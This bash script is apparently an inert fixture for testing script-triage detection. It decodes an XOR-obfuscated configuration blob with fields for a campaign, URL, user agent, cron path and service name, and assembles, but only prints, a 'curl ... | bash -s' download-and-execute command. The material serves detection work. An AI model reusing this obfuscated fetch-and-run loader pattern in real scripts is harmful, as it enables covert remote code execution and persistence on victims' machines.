# configuration reconstruction
#!/usr/bin/env bash
# Huntress Script Triage -- inert static-analysis fixture (bash_linux)
readonly Material_78df9d3c='168,149,164,216,171,223,186,202,185,132,229,134,247,130,235,153,252,163,209,180,217,182,194,167,139,239,134,245,133,228,144,243,155,196,180,221,173,200,180,213,177,208,160,212,177,195,254,157,232,154,246,169,218,174,202,165,208,164,251,139,226,146,247,139,248,140,237,138,239,176,211,188,201,167,211,238,223,163,192,161,204,188,221,180,211,189,226,139,239,210,177,208,189,205,172,197,162,204,225,131,229,131,226,219,191,140,189,143,235,151,226,144,252,193,169,221,169,217,170,144,191,144,242,148,242,147,170,206,253,204,254,154,180,209,169,200,165,213,185,220,242,155,245,131,226,142,231,131,172,200,173,152,254,201,170,152,170,132,247,159,227,150,229,128,242,173,204,171,206,160,212,233,161,212,186,206,188,217,170,217,149,244,150,185,219,189,219,186,131,231,212,229,215,179'
readonly Codec_78df9d3c='decimal_comma|rolling_xor|de'

Load_78df9d3c() {
  item1=()
  local IFS=','
  read -r -a item1 <<< "${Material_78df9d3c}"
}

Decode_78df9d3c() {
  item2=()
  local item7=222
  local item5
  for ((item5=0; item5<${#item1[@]}; item5++)); do
    item2+=("$((item1[item5] ^ item7))")
    item7=${item1[item5]}
  done
}

Recover_78df9d3c() {
  local -a item1 item2
  local item3 item4 item8 item5
  item4=$((19 * 7 - 133))
  Load_78df9d3c
  item8=0; while ((item8 < 1)); do Decode_78df9d3c; ((item8+=1)); done
  item3=''
  local octal character
  for item5 in "${!item2[@]}"; do
    printf -v octal '%03o' "${item2[item5]}"
    printf -v character '%b' "\\$octal"
    item3+="$character"
  done
  printf '%s\n' "$item3"
}

Inspect_78df9d3c() { Recover_78df9d3c; }

Plan_78df9d3c() {
  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''
  descriptor="$(Inspect_78df9d3c)"
  local -a fields
  IFS='|' read -r -a fields <<< "$descriptor"
  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done
  local -a request_command=(curl --fail --silent --show-error "$url")
  local -a interpreter=(bash -s)
  declare -p request_command interpreter
}

if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_78df9d3c; fi

# reconstruction complete